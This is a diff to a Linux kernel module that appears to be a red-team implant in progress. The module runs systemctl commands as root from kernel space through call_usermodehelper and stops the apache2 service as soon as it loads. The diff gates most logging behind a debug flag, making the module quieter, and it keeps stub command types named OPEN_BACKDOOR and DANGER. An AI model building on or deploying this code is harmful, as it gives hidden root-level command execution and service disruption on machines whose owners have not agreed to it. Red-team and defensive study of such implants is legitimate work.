@@ -5,6 +5,8 @@
 #include <linux/unistd.h>
 #include <linux/string.h>
 
+#define DEBUG_K
+
 // Time to implement a custom command language in the linux kernel :)
 typedef enum COMMANDS {
     START_SERVICE = 0,
@@ -21,17 +23,25 @@ static int execute_and_get_status(command_t type, char *argument){
     switch(type){
         case START_SERVICE:
         case STOP_SERVICE:
-            pr_info("PRAC: %sing service %s\n", type == START_SERVICE ? "start" : "stop", argument);
+            #ifdef DEBUG_K
+                pr_info("PRAC: %sing service %s\n", type == START_SERVICE ? "start" : "stop", argument);
+            #endif
             snprintf(command, 127, "systemctl %s %s", type == START_SERVICE ? "start" : "stop", argument);
             break;
         case OPEN_BACKDOOR:
-            pr_err("OPEN_BACKDOOR: Not yet implemented");
+            #ifdef DEBUG_K
+                pr_err("OPEN_BACKDOOR: Not yet implemented");
+            #endif
             return -1;
         case DANGER:
-            pr_err("DANGER: Not yet implemented");
+            #ifdef DEBUG_K
+                pr_err("DANGER: Not yet implemented");
+            #endif
             return -1;
         default:
-            pr_err("Invalid Command Type: %d\n", type);
+            #ifdef DEBUG_K
+                pr_err("Invalid Command Type: %d\n", type);
+            #endif
             return -1;
     }
     
@@ -39,7 +49,9 @@ static int execute_and_get_status(command_t type, char *argument){
     char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if (ret != 0){
-        pr_err("Error (%d) executing command: \"%s\"\n", ret, command);
+        #ifdef DEBUG_K
+            pr_err("Error (%d) executing command: \"%s\"\n", ret, command);
+        #endif
     }
 
     return ret;
@@ -49,12 +61,14 @@ static int __init misc_device_init(void) {
     command_t type = STOP_SERVICE;
     char *arg_s = "apache2";
     int status = execute_and_get_status(type, arg_s);
-    pr_info("Status: %d\n", status);
+    #ifdef DEBUG_K
+        pr_info("Status: %d\n", status);
+    #endif
     return 0;
 }
 
 static void __exit misc_device_exit(void) {
-    pr_info("Module unloaded\n");
+    pr_info("REDTEAM: Module unloaded\n");
 }
 
 module_init(misc_device_init);
